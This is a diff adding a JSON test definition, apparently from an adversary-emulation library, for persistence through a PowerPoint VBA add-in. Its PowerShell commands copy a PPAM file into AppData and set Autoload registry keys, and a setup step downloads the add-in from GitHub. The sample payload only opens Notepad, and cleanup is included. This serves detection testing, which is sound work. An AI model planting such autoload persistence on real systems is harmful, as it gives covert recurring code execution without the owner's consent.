@@ -1,0 +1,35 @@
+{
+    "name": "Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM)",
+    "description": "Creates a PowerPoint VBA Add-in file (PPAM) which runs automatically when PowerPoint is started The sample PPA provided launches the notepad as a proof-of-concept for persistent execution from Office. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "name": "powershell",
+        "command": "Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\" \"$env:APPDATA\\Microsoft\\Addins\\notepad.ppam\"\n$ver = (New-Object -COMObject \"PowerPoint.Application\").version\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\PowerPoint\\AddIns\\notepad\"\nNew-Item -type Directory $ExcelRegPath -Force | Out-Null\nNew-ItemProperty $ExcelRegPath \"Autoload\" -value \"1\" -propertyType DWORD  | Out-Null\nNew-ItemProperty $ExcelRegPath \"Path\" -value \"notepad.ppam\" -propertyType string | Out-Null\nStop-Process -Name \"PowerPnt\" -ErrorAction Ignore\nStart-Process \"PowerPnt\"\n",
+        "cleanup_command": "$ver = (New-Object -COMObject \"PowerPoint.Application\").version\nRemove-Item \"HKCU:\\Software\\Microsoft\\Office\\$Ver\\PowerPoint\\AddIns\\notepad\" -ErrorAction Ignore\nStop-Process -Name \"notepad\",\"PowerPnt\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\AddIns\\notepad.ppam\"  -ErrorAction Ignore",
+        "type": "Command Executor"
+    },
+    "id": "T1137.006",
+    "tactics": [
+        "Persistence"
+    ],
+    "technique": "Add-ins",
+    "source": "ART",
+    "uuid": "f89e58f9-2b49-423b-ac95-1f3e7cfd8277",
+    "arguments": null,
+    "preconditions": [
+        {
+            "description": "Microsoft Excel must be installed\n",
+            "prereq_command": "try {\n  New-Object -COMObject \"PowerPoint.Application\" | Out-Null\n  Stop-Process -Name \"PowerPnt\"\n  exit 0\n} catch { exit 1 }\n",
+            "get_prereq_command": "Write-Host \"You will need to install Microsoft PowerPoint manually to meet this requirement\"\n"
+        },
+        {
+            "description": "PPAM file must exist on disk at specified location",
+            "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/PptVBAaddin.ppam\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\""
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
